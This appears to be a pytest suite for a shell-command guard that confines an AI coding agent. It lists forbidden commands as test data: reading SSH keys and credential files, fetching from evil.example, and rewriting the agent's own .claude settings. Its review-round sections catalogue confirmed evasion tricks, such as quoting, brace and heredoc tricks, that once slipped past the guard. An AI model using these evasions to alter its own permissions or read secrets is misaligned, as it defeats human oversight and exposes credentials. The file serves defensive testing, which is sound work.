# agents/dev/tests/test_guard.py
import io
import json
import subprocess
import sys
from pathlib import Path

import pytest
from dev_agent import guard
from kd import naming

A = "/srv/digipaddock-agents/dev"
S = "abcdef0123456789abcdef0123456789abcdef01"  # a full sha — kd-merge accepts nothing else
ALLOWED = [
    "git status", "git diff origin/main...HEAD", "git add -A && git commit -m 'feat: x'", "git fetch origin && git switch -c agent/KD-12-x origin/main",
    "git fetch origin && git merge origin/main", "timeout 120 git fetch origin", "git commit -m 'fix: a > b'",
    "git fetch github claude/peaceful-gates-x", "git merge github/claude/peaceful-gates-x",  # the mirror
    "kd-deps install",
    "pytest -q", "pytest -q 2>/dev/null", "python3 -m pytest agents/dev/tests -q", f"cd {A}/work/DigiPaddock",
    "git log > /dev/null",
    f"kd-pr digipaddock KD-12 --title 'KD-12: x' --body-file {A}/work/tmp/kd-pr-12.md", "kd-forge pr digipaddock 12", "kd-forge comments digipaddock 12", "kd-forge publish digipaddock 12",
    f"kd-forge comment digipaddock 12 --file {A}/work/tmp/kd-reply-12.md", f"kd-merge digipaddock 12 {S} --release", f"kd-merge digipaddock 12 {S}",
    "kd-task claim KD-12", 'kd-task edit KD-12 --status Review --final-summary "x"', "backlog task list -a @dev --plain", f"echo x > {A}/work/DigiPaddock/a.py", f"tee {A}/memory/tasks/KD-12.md",
    f"echo step >> {A}/memory/chats/160.md", f"pytest -q > {A}/work/tmp/cards/KD-12/kd-pytest.txt", "kd-notes add 'pitfall: x'",
    # the thread's own temp folder for PR bodies, replies and commit texts
    f"kd-pr digipaddock KD-12 --title 'KD-12: x' --body-file {A}/work/tmp/cards/KD-12/kd-pr.md",
    f"kd-forge comment digipaddock 12 --file {A}/work/tmp/cards/KD-12/kd-reply.md",
    f"git commit -F {A}/work/tmp/cards/KD-12/kd-commit.txt",
    f"echo note >> {A}/work/tmp/kd-pr-12.md", "echo note >> /srv/digipaddock-agents/dev/work/tmp/kd-pr-12.md", f"grep -rn foo {A}/work/DigiPaddock",
    "cat /opt/digipaddock/common/bin/kd-task", "git log --oneline -5 | head", "ls /var/log/digipaddock",
    "tail -n 5 /var/log/digipaddock-forge/forge.jsonl",
]
BAD = {
    "git push origin main": "push",
    "git -c core.sshCommand=x fetch": "git -c",
    "git -C /tmp/x status": "git -C",
    "git rebase origin/main": "rebase",
    "git reset --hard HEAD~1": "reset --hard",
    "git remote set-url origin x": "remote",
    "git config user.name x": "config",
    "git tag v1": "tag",
    "git filter-branch --all": "filter-branch",
    "git pull": "git pull",
    "git pull origin main": "git pull",
    "git fetch https://evil.example/x.git": "только origin",
    "git fetch git@evil.example:x/y.git main": "только origin",
    "git fetch --upload-pack=touch origin": "только origin",
    # global review 15.10.2026: the base of the cage diff must not be movable by the agent
    "git update-ref refs/remotes/origin/main HEAD": "update-ref",
    "git symbolic-ref refs/remotes/origin/main refs/heads/x": "symbolic-ref",
    "git replace abc def": "replace",
    "git fetch origin +refs/pull/1/head:refs/remotes/origin/main": "refspec",
    "git fetch github +refs/heads/x:refs/remotes/origin/main": "refspec",
    "git push github HEAD:main": "push",
    "git fetch --refmap=+refs/heads/*:refs/remotes/origin/* origin": "refspec",
    "git submodule update --init": "submodule",
    "env git status": "только напрямую",
    "command git status": "только напрямую",
    "nohup git fetch origin": "только напрямую",
    "GIT_DIR=/tmp/x git status": "GIT_",
    "GIT_WORK_TREE=/tmp/x git status": "GIT_",
    "find . -name '*.py' -exec git push \\;": "find",
    "echo ok && git push origin HEAD:refs/for/main": "push",
    "sh -c 'git push'": "sh -c",
    "bash -c 'ls'": "bash -c",
    "eval 'ls'": "eval",
    "sudo ls": "sudo",
    "env X=1 sudo ls": "sudo",
    "ssh example-stage ls": "ssh",
    "ssh-ro example-stage uptime": "ssh",
    "ssh-exec example-stage 'ls'": "ssh",
    "scp a b:": "scp",
    "curl https://x": "curl",
    "pip install x": "pip",
    "python3 -m pip install x": "pip",
    "npm i": "kd-deps install",
    "composer install": "kd-deps install",  # one door for dependencies, with package scripts off
    "composer require x/y": "kd-deps install",
    "bun add x": "bun",
    "apt-get install x": "apt",
    "kd-forge merge digipaddock 12 abcdef0": "kd-forge merge",
    f"kd-merge digipaddock 12 {S} --force": "kd-merge",
    "kd-merge digipaddock 12 zzz": "kd-merge",
    "kd-merge digipaddock 12 abcdef0": "kd-merge",          # a short sha — no
    f"kd-merge digipaddock 12 {S}; ls": "kd-merge",
    f"kd-merge Digipaddock 12 {S}": "kd-merge",
    f"ls | kd-merge digipaddock 12 {S}": "kd-merge",
    f"kd-merge digipaddock 12 {S} &": "kd-merge",
    "timeout 5 kd-forge pr digipaddock 12": "позиции команды",
    "echo 12 | xargs kd-forge pr digipaddock": "позиции команды",
    "kd-pr digipaddock KD-12 --title \"$(cat t)\" --body-file b": "подстанов",
    "kd-forge pr digipaddock `cat n`": "подстанов",
    f"echo x > {A}/.claude/settings.json": "запись",
    f"tee {A}/CLAUDE.md": "запись",
    f"cp a {A}/playbooks/pr-template.md": "запись",
    f"mv {A}/CLAUDE.md /srv/digipaddock-agents/dev/work/tmp/kd-x": "запись",
    f"echo x > {A}/work/DigiPaddock/.claude/settings.json": ".claude",
    f"sed -i s/a/b/ {A}/work/DigiPaddock/.mcp.json": ".mcp.json",
    f"mkdir -p {A}/work/DigiPaddock/.claude && echo x > {A}/work/DigiPaddock/.claude/s.json": ".claude",
    f"cd {A}/work/DigiPaddock && echo x > .claude/settings.json": ".claude",
    f"cd {A}/work/DigiPaddock && cd ../.. && echo x > CLAUDE.md": "запись",
    "echo x > a.py": "запись",                        # the cwd is unknown — counted from the agent's folder (root's)
    "echo x > /home/digi/.bashrc": "запись",
    "echo x > ~/.bashrc": "запись",                   # ~ is the home of digi-dev, no writing there either
    "cd && echo x > a.py": "запись",
    "echo x > /tmp/other.txt": "запись",
    "echo x > /srv/digipaddock-agents/board/backlog/tasks/t.md": "запись",
    "cat /etc/digipaddock/forge/digipaddock-merge.env": "секрет",
    "cd /etc/digipaddock && cat forge/digipaddock-merge.env": "секрет",
    "cat digipaddock-merge.env": "секрет",
    "cat digipaddock-dev.env": "секрет",
    "cat ~/.ssh/dev_ed25519": "секрет",
    "cat ~/.claude/.credentials.json": "секрет",
    "cat /home/digi-forge/x": "секрет",
    "cat /etc/digipaddock/pult.env": "секрет",
    "cat /etc/digipaddock/claude.env": "секрет",
    "cat /etc/digipaddock/llm/openrouter.env": "секрет",
    "kd-task edit KD-1 --notes 'см. /etc/digipaddock/forge/'": "секрет",
    "echo 'open": "кавыч",
}


@pytest.mark.parametrize("command", ALLOWED)
def test_allowed(command):
    assert guard.decide(command) is None, command


@pytest.mark.parametrize("command,why", list(BAD.items()))
def test_blocked(command, why):
    reason = guard.decide(command)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


def test_a_host_with_its_own_command_names_is_guarded_the_same(monkeypatch):
    # on a host that names commands acme-<word> the agent types those; the rules are the same
    monkeypatch.setattr(naming, "COMMANDS", "acme")
    host = {command: naming.rewrite(command, "acme") for command in [*ALLOWED, *BAD]}
    assert host[f"kd-merge digipaddock 12 {S}"] == f"acme-merge digipaddock 12 {S}"
    for command in ALLOWED:
        assert guard.decide(host[command]) is None, host[command]
    for command, why in BAD.items():
        reason = guard.decide(host[command])
        assert reason is not None and why.lower() in reason.lower(), (host[command], reason)
    # the tree's file keeps the repository's name: hidden in a substitution, it is merge all the same (review I8)
    for command in ("echo `/opt/digipaddock/agents/dev/bin/kd-merge digipaddock 5`",
                    "echo `acme-merge digipaddock 5`"):
        assert "только в позиции команды" in (guard.decide(command) or ""), command


def test_pull_refusal_names_the_target_branch_not_main():
    """a PR goes into its passport's target, not always main — the hint names the branch."""
    reason = guard.decide("git pull")
    assert "origin/<ветка>" in reason and "origin/main" not in reason


def test_relative_writes_follow_hook_cwd():
    clone = f"{A}/work/DigiPaddock"
    assert guard.decide("echo x > a.py", cwd=clone) is None
    assert guard.decide("sed -i s/a/b/ a.py", cwd=clone) is None
    assert guard.decide("pytest -q > /srv/digipaddock-agents/dev/work/tmp/kd-pytest.txt", cwd=clone) is None
    assert guard.decide("echo x > a.py", cwd=A) is not None          # the agent's folder is root's, no writing
    assert guard.decide("echo x > .claude/settings.json", cwd=clone) is not None
    assert guard.decide("cd ../.. && echo x > b.py", cwd=clone) is not None


def test_reasons_name_the_offender():
    assert guard.decide("bash -c 'ls'").startswith("bash -c")
    assert guard.decide("sh -c 'ls'").startswith("sh -c")
    assert "без env" in guard.decide("env git status")


def test_main_is_hook_protocol():
    ev = json.dumps({"tool_name": "Bash", "tool_input": {"command": "git push"}})
    err = io.StringIO()
    assert guard.main(io.StringIO(ev), stderr=err) == 2 and err.getvalue().startswith("⛔")
    ev = json.dumps({"tool_name": "Bash", "tool_input": {"command": "git status"}})
    out = io.StringIO()
    assert guard.main(io.StringIO(ev), stdout=out, stderr=io.StringIO()) == 0
    assert json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"] == "allow"
    ev = json.dumps({"tool_name": "Bash", "tool_input": {"command": "echo x > a.py"}, "cwd": f"{A}/work/DigiPaddock"})
    assert guard.main(io.StringIO(ev), stdout=io.StringIO(), stderr=io.StringIO()) == 0  # the cwd reaches decide
    ev = json.dumps({"tool_name": "Bash", "tool_input": {"command": "echo x > a.py"}})
    assert guard.main(io.StringIO(ev), stdout=io.StringIO(), stderr=io.StringIO()) == 2


def test_main_runs_channel_expectations_only_after_the_guard_passed():
    seen = []
    def after_bash(event):
        seen.append(event["tool_input"]["command"])
        return "нет записи"
    run = lambda command: guard.main(io.StringIO(json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})),  # noqa: E731
                                     stdout=io.StringIO(), stderr=io.StringIO(), after_bash=after_bash)
    assert run("git push") == 2 and seen == []
    assert run("git status") == 2 and seen == ["git status"]


# --- beyond the brief: the home of digi-dev, ~user, targets that cannot be expanded, the entry point -------------

CLONE = f"{A}/work/DigiPaddock"


@pytest.mark.parametrize("command", [
    "echo x > ~digi-dev/a.py",           # bash expands it to /home/digi-dev/a.py, not <clone>/~digi-dev/a.py
    "tee ~digi-dev/.bashrc",
    "cd ~digi-dev && echo x > a.py",
    "echo x > ~digi/.bashrc",            # the sysadmin's home is not the home of digi-dev, but no writing there either
    "cd ~digi && echo x > a.py",
    "echo x > ~root/a",
    "echo x > ~+/a.py",                   # ~+ / ~- are directory stack entries: the guard does not know them
    "echo x > ~-/CLAUDE.md",
    "cd ~- && echo x > CLAUDE.md",
    "echo x > $HOME/a.py",
    "echo x > ${HOME}/a.py",
    "echo x > $OLDPWD/CLAUDE.md",         # the guard does not expand a substitution in a redirection target — refused
    "echo x > \"$OLDPWD/CLAUDE.md\"",
    f"echo x > $(echo {A}/CLAUDE.md)",
    f"echo x > `echo {A}/CLAUDE.md`",
    "cd $OLDPWD && echo x > CLAUDE.md",
    "cd \"$(git rev-parse --show-toplevel)/../..\" && echo x > CLAUDE.md",
    "popd && echo x > a.py",
])
def test_home_and_unresolved_targets_blocked_even_from_clone(command):
    reason = guard.decide(command, cwd=CLONE)
    assert reason is not None and "запис" in reason.lower(), (command, reason)


@pytest.mark.parametrize("command", [
    "echo x > ~digi-dev/../../srv/digipaddock-agents/dev/work/tmp/kd-a.md",  # ~digi-dev is expanded correctly
    "echo x > ~/../../srv/digipaddock-agents/dev/work/tmp/kd-a.md",
    "pytest -q 2>&1 | tail -n 5",
    "echo err >&2",
    "pytest -q &> /srv/digipaddock-agents/dev/work/tmp/kd-pytest.txt",
    "git diff HEAD~1 > /srv/digipaddock-agents/dev/work/tmp/kd-diff.txt",
    "for f in *.py; do sed -i s/a/b/ $f; done",   # a substitution in a writer's operand counts from the clone (a convenience; the boundary is file rights)
])
def test_clone_conveniences_allowed(command):
    assert guard.decide(command, cwd=CLONE) is None, command


def test_git_config_env_is_like_dash_c():
    assert "git -c" in guard.decide("git --config-env=core.sshCommand=X fetch origin")


def test_old_text_folder_is_refused_naming_the_new_one():
    why = guard.decide(f"echo x > {A}/tmp/kd-pr-12.md", cwd=f"{A}/work/DigiPaddock")
    assert why and f"{A}/work/tmp/" in why


# --- review round 1: confirmed bypasses (each one was ALLOW before the fix) ----------------------------------------

TMPD = f"{A}/work/tmp"
FIX1 = [  # (command, the event's cwd, what the reason contains)
    # 1. ANSI-C quotes hide merge: bash expands \x6d / \155 into "m", shlex does not
    (f"kd-forge $'\\x6derge' digipaddock 12 {S}", None, "$'"),
    (f"kd-forge $'\\155erge' digipaddock 12 {S}", None, "$'"),
    (f"kd-forge $'\\x6d'erge digipaddock 12 {S}", None, "$'"),
    # 2. … and .claude / .mcp.json for every writer
    ("echo x > $'\\x2eclaude'/settings.json", CLONE, "$'"),
    ("tee $'\\x2eclaude/settings.json'", CLONE, "$'"),
    ("cp a $'\\x2emcp.json'", CLONE, "$'"),
    ("sed -i s/a/b/ $'\\x2emcp.json'", CLONE, "$'"),
    (f"echo x > {CLONE}/$'\\x2eclaude'/settings.json", CLONE, "$'"),
    # 3. cd: a failed one (; goes on), in a subshell, pushd -n, env -C, CDPATH
    (f"cd {A}/work/tmp/nope; tee .claude/settings.json", CLONE, "запис"),
    (f"(cd {A}/work/tmp) && echo x > .claude/settings.json", CLONE, ".claude"),
    (f"(cd {A}/work/tmp); tee .claude/settings.json", CLONE, ".claude"),
    (f"pushd -n {A}/work/tmp && echo x > .claude/settings.json", CLONE, "запис"),
    (f"env -C {CLONE} tee .claude/settings.json", TMPD, "запис"),
    (f"CDPATH={A}/work cd DigiPaddock && echo x > .claude/settings.json", TMPD, "запис"),
    # 4. a $NAME assigned in the same command, and $(…) in writers' operands
    ("X=.claude/settings.json; tee $X", CLONE, "запис"),
    ("X=.claude/settings.json; cp a $X", CLONE, "запис"),
    ("X=.mcp.json; sed -i s/a/b/ $X", CLONE, "запис"),
    ("tee $(echo .claude/settings.json)", CLONE, "запис"),
    # 5. a glob in a component with a dot
    ("echo x > .cla*/settings.json", CLONE, "запис"),
    ("tee .cl?ude/settings.json", CLONE, "запис"),
    ("sed -i s/a/b/ .m*.json", CLONE, "запис"),
]


@pytest.mark.parametrize("command,cwd,why", FIX1)
def test_review_round1_bypasses_blocked(command, cwd, why):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


# of the same kind, found while fixing (ALLOW before it as well)
EXTRA1 = [
    (f"cd {A}/work/tmp/nope && echo a; tee .claude/settings.json", CLONE),   # the chain after cd is broken by ";"
    (f"true || cd {A}/work/tmp && tee .claude/settings.json", CLONE),        # a cd after || may not have run
    (f"true | cd {A}/work/tmp && tee .claude/settings.json", CLONE),         # a cd in a pipeline runs in a subshell
    (f"! cd {A}/work/tmp/nope && tee .claude/settings.json", CLONE),         # ! cd: a failure gives 0 — && runs
    (f"cd {A}/work/tmp && echo & tee .claude/settings.json", CLONE),         # & — in the background, then the old directory
    (f"export CDPATH={A}/work; cd DigiPaddock && tee .claude/settings.json", TMPD),
    ("tee $PWD/.claude/settings.json", CLONE),                           # the hook does not know environment variables
    ("echo x > $PWD/.claude/settings.json", CLONE),
    ("echo .claude/settings.json | xargs tee", CLONE),                   # the operands come from stdin
    ("tee {.claude,x}/settings.json", CLONE),                            # brace expansion
    ("shopt -s dotglob; tee */settings.json", CLONE),                    # * finds .claude too
    ("shopt -s extglob; tee @(.claude)/settings.json", CLONE),
    ("ln -s .claude y && echo x > y/settings.json", CLONE),              # a link to .claude
    ("ln -s . y && echo x > y/.claude/settings.json", CLONE),            # .claude deeper than the clone's root
    ("echo x > sub/.claude/settings.json", CLONE),
    ("echo x >| .claude/settings.json", CLONE),
    ("echo x &> .claude/settings.json", CLONE),
    ("for f in .claude/settings.json; do tee $f; done", CLONE),
    ("for f in $(echo .claude/settings.json); do tee $f; done", CLONE),
    ("for f in a.py; do f=.claude/settings.json; tee $f; done", CLONE),
    ("echo \"$(echo x > .claude/settings.json)\"", CLONE),               # the parser took a > in "$(…)" for text
    ("echo \"`echo x > .claude/settings.json`\"", CLONE),
]


@pytest.mark.parametrize("command,cwd", EXTRA1)
def test_related_write_bypasses_blocked(command, cwd):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and "запис" in reason.lower(), (command, reason)


def test_nested_merge_and_env_split_blocked():
    assert "kd-forge merge" in guard.decide(f"echo \"$(kd-forge merge digipaddock 12 {S})\"")
    assert "kd-forge merge" in guard.decide(f"echo `kd-forge merge digipaddock 12 {S}`")
    assert "env -S" in guard.decide("env -S 'tee .claude/settings.json'", cwd=CLONE)


ALLOWED1 = [  # no convenience is lost (the forms with cd X && … are in CD_COMPOUNDS: cd is now only a call of its own)
    "for f in a.py b.py; do echo x > $f.bak; done",
    "echo \"$(date)\" > /srv/digipaddock-agents/dev/work/tmp/kd-x",
    "git commit -m \"$(cat <<'EOF'\nfeat: a -> b, don't > c\n\nEOF\n)\"",
    "git commit -m 'cost $'",
    "out=\"$(pytest -q 2>&1)\"; echo \"$out\" > /srv/digipaddock-agents/dev/work/tmp/kd-out.txt",
    "ln -s ../README.md docs/README.md",
]


@pytest.mark.parametrize("command", ALLOWED1)
def test_round1_conveniences_allowed(command):
    assert guard.decide(command, cwd=CLONE) is None, command


# --- review round 2: brace expansion, line joining, env with options (each one was ALLOW before the fix) ----------

FIX2 = [  # (command, the event's cwd, what the reason contains)
    (f"kd-forge {{merge,}} digipaddock 12 {S}", None, "kd-forge"),           # bash: {merge,} → merge
    (f"kd-forge me{{r,}}ge digipaddock 12 {S}", None, "kd-forge"),
    (f"kd-forge mer\\\nge digipaddock 12 {S}", None, "kd-forge merge"),     # bash removes \ + newline
    (f"env -iC {CLONE} tee .claude/settings.json", TMPD, "env"),      # -iC: -C inside a bundle of options
    (f"env -vC {CLONE} tee .claude/settings.json", TMPD, "env"),
    (f"env --chdir {CLONE} tee .claude/settings.json", TMPD, "env"),
    (f"env -iC {CLONE} sed -i s/a/b/ .mcp.json", TMPD, "env"),
    (f"env -iC {CLONE} cp a .mcp.json", TMPD, "env"),
    (f"env -iu X tee {A}/CLAUDE.md", TMPD, "env"),
    # braces {a..b} and {a,b} in a write target — the target cannot be computed
    ("echo x > .cl{a..a}ude/settings.json", CLONE, "запис"),
    ("tee .cl{a..a}ude/settings.json", CLONE, "запис"),
    ("cp a .{claude,x}/settings.json", CLONE, "запис"),
]


@pytest.mark.parametrize("command,cwd,why", FIX2)
def test_review_round2_bypasses_blocked(command, cwd, why):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


EXTRA2 = [  # of the same kind, found while fixing
    (f"{{kd-forge,merge}} digipaddock 12 {S}", None, "имя команды"),       # bash: kd-forge merge digipaddock …
    (f"/opt/digipaddock/agents/dev/bin/kd-forg? merge digipaddock 12 {S}", None, "имя команды"),
    (f"kd-forge m?rge digipaddock 12 {S}", None, "kd-forge"),               # the glob would find a file named merge in the directory
    (f"kd-forge [m]erge digipaddock 12 {S}", None, "kd-forge"),
    ("kd-forge pr digipaddock 12 merge", None, "kd-forge merge"),
    (f"echo a\\\n#;kd-forge merge digipaddock 12 {S}", None, "kd-forge merge"),   # joined: a#;… — the # is not a comment
    (f"echo a # c \\\nkd-forge merge digipaddock 12 {S}", None, "kd-forge merge"),  # a \ in a comment joins nothing
    (f"echo \"$(kd-forge {{merge,}} digipaddock 12 {S})\"", None, "kd-forge"),
    ("X=tee; $X .claude/settings.json", CLONE, "имя команды"),
    ("/usr/bin/te? .claude/settings.json", CLONE, "имя команды"),
    ("`echo tee` .claude/settings.json", CLONE, "имя команды"),
    ("echo \"$($X .claude/settings.json)\"", CLONE, "имя команды"),     # the same in "$(…)" — the write parser
    (f"echo \"$(env -iC {CLONE} tee .claude/settings.json)\"", TMPD, "env"),
    ("tee .cla\\\nude/settings.json", CLONE, ".claude"),
]


@pytest.mark.parametrize("command,cwd,why", EXTRA2)
def test_round2_related_blocked(command, cwd, why):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


ALLOWED2 = [  # no convenience is lost
    "env X=1 pytest -q",
    "cat > /srv/digipaddock-agents/dev/work/tmp/kd-pr-12.md <<'EOF'\n## Summary\n* change $x\n[link](https://x) {a,b}\nEOF",   # a <<'EOF' body is text
    "[ -f a.py ] && echo x > b.py",
    "{ echo a; echo b; } > /srv/digipaddock-agents/dev/work/tmp/kd-x",
    "git log --oneline -3 \\\n  > /srv/digipaddock-agents/dev/work/tmp/kd-log",
    "arr[0]=x",
]


@pytest.mark.parametrize("command", ALLOWED2)
def test_round2_conveniences_allowed(command):
    assert guard.decide(command, cwd=CLONE) is None, command


# --- review round 3: heredoc boundaries, comments in an unquoted body ---------------------------------------------
# bash 5.2 behaviour was checked by a script (a <<EOF body runs $(…) even in a line with #; ' EOF' and 'EOF ' do not
# end a <<'EOF' body; <<- strips only tabs; no delimiter — the rest of the input is the body; << in $((…)) is a shift)

T = "\t"
CL = f"{A}/CLAUDE.md"
HEREDOC_BLOCKED = [  # (command, cwd, what the reason contains) — the reason the case was written for, not a chance one
    # (a) a real command after a closed <<'EOF' is checked
    (f"cat <<'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\nbody\nEOF\necho x > {CL}", A, "запись разрешена"),
    # (b) the delimiter never came: bash takes the rest for the body, the guard for code (stricter), the forbidden
    # write does not pass
    (f"cat <<'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\nbody\necho x > {CL}", A, "запись разрешена"),
    ("cat <<EOF > /srv/digipaddock-agents/dev/work/tmp/kd-x\nbody\n$(echo x > .claude/settings.json)", CLONE, "heredoc"),   # unquoted — a substitution
    # (c) <<- and a delimiter with a tab, then a forbidden write
    (f"cat <<-'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\n{T}body\n{T}EOF\necho x > {CL}", A, "запись разрешена"),
    # (d) <<'EOF' inside $(…), then a forbidden write
    (f"x=\"$(cat <<'EOF'\nbody\nEOF\n)\"; echo x > {CL}", A, "запись разрешена"),
    (f"cat $(cat <<'EOF'\nbody\nEOF\n) > /srv/digipaddock-agents/dev/work/tmp/kd-x; echo x > {CL}", A, "запись разрешена"),
    # (e) two heredocs on one line, then a forbidden write
    (f"cat <<ONE <<'TWO' > /srv/digipaddock-agents/dev/work/tmp/kd-x\na\nONE\nb\nTWO\necho x > {CL}", A, "запись разрешена"),
    # (f) 'EOF ' and ' EOF' do not end the body; a forbidden write after the real EOF is refused
    (f"cat <<'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\n EOF\nEOF \nbody\nEOF\necho x > {CL}", A, "запись разрешена"),
    (f"cat <<'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\nbody\nEOF \necho x > {CL}", A, "запись разрешена"),   # EOF never came — the rest is code
    (f"cat <<-'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\n{T}x\n  EOF\necho x > {CL}", A, "запись разрешена"),  # <<- strips tabs, not spaces
    # (g) an unquoted body: a line with # is not a comment, $(…) runs
    (f"cat <<EOF > /srv/digipaddock-agents/dev/work/tmp/kd-x\n# $(kd-forge merge digipaddock 12 {S})\nEOF", None, "heredoc"),
    ("cat <<EOF > /srv/digipaddock-agents/dev/work/tmp/kd-x\n# $(echo x > .claude/settings.json)\nEOF", CLONE, "heredoc"),
    ("cat <<EOF > /srv/digipaddock-agents/dev/work/tmp/kd-x\n# `echo x > .claude/settings.json`\nEOF", CLONE, "heredoc"),
    # of the same kind: a \ at the end of a body line joins it to "EOF" (x\<nl>EOF is xEOF, the body goes on)
    (f"cat <<EOF > /srv/digipaddock-agents/dev/work/tmp/kd-x\nx\\\nEOF\n# $(kd-forge merge digipaddock 12 {S})\nEOF", None, "heredoc"),
    (f"cat <\\\n<EOF > /srv/digipaddock-agents/dev/work/tmp/kd-x\n# $(kd-forge merge digipaddock 12 {S})\nEOF", None, "heredoc"),   # <\<nl>< is a heredoc too
    ("cat <<$X > /srv/digipaddock-agents/dev/work/tmp/kd-x\nbody\n$X", CLONE, "heredoc"),                                       # an unusual delimiter
    # << where bash sees no heredoc — the lines after it stay commands
    (f"echo $(( 1 <<'X' ))\nkd-forge merge digipaddock 12 {S}\nX", None, "kd-forge merge"),
    (f"echo ${{x:-<<'X' }}\nkd-forge merge digipaddock 12 {S}\nX", None, "kd-forge merge"),
    (f"cat <<<'X'\nkd-forge merge digipaddock 12 {S}\nX", None, "kd-forge merge"),
    (f"echo a # <<'X'\nkd-forge merge digipaddock 12 {S}\nX", None, "kd-forge merge"),
    # the variants of round 2
    (f"kd-forge {{m,}}erge digipaddock 12 {S}", None, "kd-forge: без {…}"),
    (f"kd-forge mer\\\n\nge digipaddock 12 {S}", None, "kd-forge: только"),  # bash: kd-forge mer and ge — mer is not a subcommand
    (f"env -0C {CLONE} tee .claude/settings.json", TMPD, "env с опциями"),
    (f"env --chdir={CLONE} tee .claude/settings.json", TMPD, "env с опциями"),
    (f"env -i -C {CLONE} tee .claude/settings.json", TMPD, "env с опциями"),
]


@pytest.mark.parametrize("command,cwd,why", HEREDOC_BLOCKED)
def test_round3_heredoc_boundaries_blocked(command, cwd, why):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


# --- review round 4: three paths where _lex took executed text for inert (checked against bash) -------------------

LEX4_BLOCKED = [  # (command, cwd, what the reason contains)
    # 1. a # right after the ) of $(…)/$((…)) is the middle of a word (bash: echo $(true)#; cmd runs cmd), not a comment
    (f"echo $(true)#; kd-forge merge digipaddock 12 {S}", None, "kd-forge merge"),
    (f"echo $((1))#&& kd-forge merge digipaddock 12 {S}", None, "kd-forge merge"),
    (f"echo $( (true) )#| kd-forge merge digipaddock 12 {S}", None, "kd-forge merge"),
    ("echo $(true)#; echo x > .claude/settings.json", CLONE, ".claude"),
    # 2. a newline inside $(…)/`…` opened after << on the same line: bash runs these lines,
    #    the body of the outer heredoc starts only after the end of the outer line
    (f"cat <<'X' $(echo a\nkd-forge merge digipaddock 12 {S}\n)\nbody\nX", None, "heredoc"),
    (f"cat <<'X' `echo a\nkd-forge merge digipaddock 12 {S}\n`\nbody\nX", None, "heredoc"),
    (f"cat <<'X' \"$(echo a\nkd-forge merge digipaddock 12 {S}\n)\"\nbody\nX", None, "heredoc"),
    ("cat <<'X' $(\necho x > .claude/settings.json\n)\nX", CLONE, "heredoc"),
    # 3. << inside `…`: the first ` in the body closes the substitution, the rest of the body is code outside
    (f"echo `cat <<'EOF'\nx`; kd-forge merge digipaddock 12 {S}\nEOF\n`", None, "heredoc"),
    ("echo `cat <<'EOF'\nx`; echo x > .claude/settings.json\nEOF\n`", CLONE, "heredoc"),
]


@pytest.mark.parametrize("command,cwd,why", LEX4_BLOCKED)
def test_round4_lex_paths_blocked(command, cwd, why):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


LEX4_ALLOWED = [  # no convenience is lost: a comment after a space and ordinary $(…)
    "echo $(date)#tag > /srv/digipaddock-agents/dev/work/tmp/kd-x",
    "x=$(( 1 + 2 )) # it's a comment",
    "echo $(true) # it's a comment; kd-forge merge",
    "git commit -m \"$(cat <<'EOF'\nfeat: x\n\n* item\nEOF\n)\"",
]


@pytest.mark.parametrize("command", LEX4_ALLOWED)
def test_round4_allowed(command):
    assert guard.decide(command, cwd=CLONE) is None, command


# --- review round 5: a bare ((…)) is a complete arithmetic command, a # after it is a comment ---------------------
# bash 5.2: ((1))#<<W<nl>echo RAN<nl>W prints RAN (a comment, the line runs); echo $((1))#<<W is a heredoc

LEX5_BLOCKED = [  # (command, cwd, what the reason contains)
    (f"((1))#<<W\nkd-forge merge digipaddock 12 {S}\nW", None, "kd-forge merge"),
    ("((1))#<<W\necho x > .claude/settings.json\nW", CLONE, ".claude"),
    (f"for ((i=0;i<1;i++))#<<W\ndo :; done\nkd-forge merge digipaddock 12 {S}\nW", None, "kd-forge merge"),
]


@pytest.mark.parametrize("command,cwd,why", LEX5_BLOCKED)
def test_round5_bare_arith_comment_blocked(command, cwd, why):
    reason = guard.decide(command, cwd=cwd)
    assert reason is not None and why.lower() in reason.lower(), (command, reason)


@pytest.mark.parametrize("command", ["((i++)) # comment", "for ((i=0;i<3;i++)); do echo $i; done # c"])
def test_round5_bare_arith_allowed(command):
    assert guard.decide(command, cwd=CLONE) is None, command


HEREDOC_ALLOWED = [  # (command, cwd)
    # an ordinary PR body: markdown, # headings, an apostrophe — a <<'EOF' body is text
    (f"cat > {A}/work/tmp/kd-pr-12.md <<'EOF'\n## Summary\n\n* Guard: don't treat `#` lines as comments\n"
     f"- [spec](https://x) {{a,b}} $HOME\n\n## Checks\npytest: 245 passed\n\n## Cage\nнет\nEOF", A),
    ("git commit -m \"$(cat <<'EOF'\nfix: heredoc # isn't a comment > ok\n\n* item\nEOF\n)\"", CLONE),
    ("cat > /srv/digipaddock-agents/dev/work/tmp/kd-x <<EOF\nHello $USER\n# not a comment, just text\n* item\nEOF", CLONE),   # unquoted, no substitutions
    (f"cat <<-'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-a\n{T}x\n{T}EOF\necho done > /srv/digipaddock-agents/dev/work/tmp/kd-b", CLONE),
    # (f) ' EOF' and 'EOF ' do not end the body — a write inside the body is text, as in bash
    (f"cat <<'EOF' > /srv/digipaddock-agents/dev/work/tmp/kd-x\n EOF\nEOF \necho x > {CL}\nEOF", A),
    ("echo $(( 1 << 2 )) > /srv/digipaddock-agents/dev/work/tmp/kd-n", CLONE),
]


@pytest.mark.parametrize("command,cwd", HEREDOC_ALLOWED)
def test_round3_heredoc_allowed(command, cwd):
    assert guard.decide(command, cwd=cwd) is None, command


# --- cd only as a call of its own: Claude Code itself sends a cd+command chain to the owner for confirmation ------
